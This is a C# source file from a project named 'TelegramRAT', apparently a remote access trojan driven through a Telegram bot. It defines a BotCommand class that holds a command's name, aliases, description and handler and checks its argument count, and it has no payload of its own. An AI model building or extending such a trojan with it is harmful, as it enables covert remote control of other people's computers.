using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;

namespace TelegramRAT
{
    class BotCommand
    {
        public string Command { get; set; }
        public string[] Aliases { get; set; }

        public string Description { get; set; } = null;
        public string Example { get; set; } = null;

        public string[] Groups { get; set; } = null;

        public Func<BotCommandModel, Task> Execute { get; set; }

        /// <summary>
        /// Count of args. If model has other number of args, validation will fail. 
        /// Special values: 
        /// <list type="table">"-1" - Any</list>
        /// <list type="table">"-2" - At least one</list>
        /// </summary>
        public int ArgsCount = -1;

        public bool ValidateModel(BotCommandModel model)
        {
            if (model == null)
                return false;

            if (this.Command != model.Command)
                return false;

            if (this.ArgsCount == model.Args.Length)
            {
                return true;
            }
            else if (ArgsCount == -1)
            {
                return true;
            }
            else if (ArgsCount == -2 && model.Args.Length > 0)
            {
                return true;
            }

            return false;
        }

    }
}
